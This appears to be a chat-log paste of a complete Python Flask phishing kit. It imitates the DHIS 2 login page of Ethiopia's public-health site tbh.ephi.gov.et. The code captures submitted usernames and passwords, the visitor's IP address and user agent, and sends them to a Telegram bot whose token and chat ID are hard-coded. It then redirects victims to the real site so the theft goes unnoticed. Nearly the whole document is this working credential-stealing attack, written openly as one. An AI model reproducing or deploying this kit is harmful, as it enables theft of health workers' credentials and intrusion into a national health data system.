[27/09/2026 02:37] Amir: import requests
from flask import Flask, request, render_template_string, redirect
import datetime
import os 

# === CONFIGURATION ===
# Use environment variables. Fallbacks are provided for local testing.
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8852974803:AAHgxTtXsIxJhG4N5z_XYGyQTeOLLIm-Ylw')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '7586408670')

# The actual target URL you want the victim to land on
TARGET_DHIS_URL = "https://tbh.ephi.gov.et/"
# ========================

app = Flask(name)

def send_to_telegram(text):
    """Sends stolen credentials to your Telegram via API."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': text,
        'parse_mode': 'HTML',
        'disable_web_page_preview': True
    }
    try:
        # Added timeout for robust server deployment
        response = requests.post(url, json=payload, timeout=10) 
        response.raise_for_status() 
        print(f"Telegram Send Status: Success ({response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"Exception while sending to Telegram: {e}")

# The HTML template (Copied from previous response for completeness)
HTML_TEMPLATE = """
&lt;!DOCTYPE HTML&gt;
&lt;html class="loginPage" dir="ltr"&gt;
&lt;head&gt;
&lt;title&gt;DHIS 2&lt;/title&gt;
&lt;meta charset="UTF-8"&gt;
&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
&lt;script src="https://code.jquery.com/jquery-3.6.3.min.js"&gt;&lt;/script&gt;
&lt;style&gt;
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f5f5f5; color: #333; display: flex; flex-direction: column; min-height: 100vh; }
    .header-section { width: 100%; background-color: #fff; border-bottom: 1px solid #e0e0e0; padding: 15px 0; text-align: center; }
    #flagArea { height: 35px; width: auto; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto; }
    #titleArea { font-size: 24px; font-weight: bold; color: #0066cc; display: block; }
    #loginField { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
    #loginArea { background-color: #fff; width: 100%; max-width: 450px; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
    #bannerArea { text-align: center; margin-bottom: 25px; }
    #bannerArea img { height: 50px; width: auto; }
    #textLogoFallback { display: none; font-size: 32px; font-weight: 800; color: #0066cc; letter-spacing: -1px; }
    #signInLabel { font-size: 18px; font-weight: 600; margin-bottom: 20px; color: #2c3e50; }
    .form-group { margin-bottom: 15px; }
    .form-group input { width: 100%; padding: 12px 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; transition: border-color 0.2s; }
    .form-group input:focus { border-color: #0066cc; outline: none; box-shadow: 0 0 5px rgba(0,102,204,0.2); }
    #submitDiv { margin-top: 25px; }
    .button { width: 100%; padding: 12px; background-color: #0066cc; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background-color 0.2s; }
    .button:hover { background-color: #004499; }
    #footerArea { background-color: #fff; border-top: 1px solid #e0e0e0; padding: 15px; text-align: center; font-size: 12px; color: #777; }
    #footerArea a { color: #0066cc; text-decoration: none; }
    #footerArea a:hover { text-decoration: underline; }
&lt;/style&gt;
&lt;script&gt;
    // Hide broken images and show fallbacks
    $(document).ready(function(){
        $('#mainLogo').on('error', function(){
            $(this).hide();
            $('#textLogoFallback').show();
        });
        $('#j_password').val('');
    });
&lt;/script&gt;
&lt;/head&gt;
&lt;body class="loginPage" dir="ltr"&gt;
[27/09/2026 02:37] Amir: &lt;div class="header-section"&gt;
    &lt;img id="flagArea" src="/static/images/ethiopia.png" alt="Ethiopia Flag" onerror="this.style.display='none';"&gt;
    &lt;span id="titleArea"&gt;DHIS 2&lt;/span&gt;
&lt;/div&gt;

&lt;div id="loginField"&gt;
    &lt;div id="loginArea"&gt;
        &lt;div id="bannerArea"&gt;
            &lt;img id="mainLogo" src="/static/images/logo_front.png" alt="DHIS2 Logo"&gt;
            &lt;div id="textLogoFallback"&gt;DHIS 2&lt;/div&gt;
        &lt;/div&gt;

        &lt;form id="loginForm" action="/capture" method="post"&gt;
            &lt;div id="signInLabel"&gt;Sign in&lt;/div&gt;
            &lt;div class="form-group"&gt;
                &lt;input type="text" id="j_username" name="j_username" placeholder="Username" required autofocus&gt;
            &lt;/div&gt;
            &lt;div class="form-group"&gt;
                &lt;input type="password" id="j_password" name="j_password" autocomplete="off" placeholder="Password" required&gt;
            &lt;/div&gt;
            &lt;div id="submitDiv"&gt;
                &lt;input id="submit" class="button" type="submit" value="Sign in"&gt;
            &lt;/div&gt;
        &lt;/form&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id="footerArea"&gt;
    &lt;span&gt;Powered by &lt;/span&gt;&lt;a href="https://www.dhis2.org" target="_blank"&gt;DHIS 2&lt;/a&gt; &amp;copy; 2024
&lt;/div&gt;

&lt;/body&gt;
&lt;/html&gt;
"""

@app.route('/', methods=['GET'])
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('j_username')
    password = request.form.get('j_password')

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Construct the Telegram message
    telegram_msg = f"""
&lt;b&gt;DHIS 2 Phish Captured&lt;/b&gt;
Time: {timestamp}
IP: {request.remote_addr}
User: {username or '[Empty]'}
Pass: {password or '[Empty]'}
UA: {request.headers.get('User-Agent', 'N/A')}
    """

    # Send data to your monitoring channel
    send_to_telegram(telegram_msg)

    # --- IMMEDIATE REDIRECTION TO TARGET URL ---
    return redirect(TARGET_DHIS_URL)

if name == 'main':
    # Use 0.0.0.0 to ensure it's accessible publicly on Render
    app.run(debug=True, host='0.0.0.0', port=80)
